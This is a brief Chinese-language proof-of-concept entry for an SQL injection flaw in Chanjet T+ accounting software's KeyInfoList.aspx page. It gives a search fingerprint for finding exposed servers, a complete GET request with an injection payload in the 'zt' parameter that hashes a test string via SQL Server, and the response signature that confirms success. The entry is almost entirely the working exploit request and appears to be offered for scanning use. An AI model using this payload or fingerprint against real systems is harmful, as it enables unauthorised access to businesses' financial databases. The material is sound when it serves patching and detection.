# 畅捷通T+KeyInfoList.aspxSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','123456')))--+ HTTP/1.1`
- **响应特征**：200 9ba59abbe56e057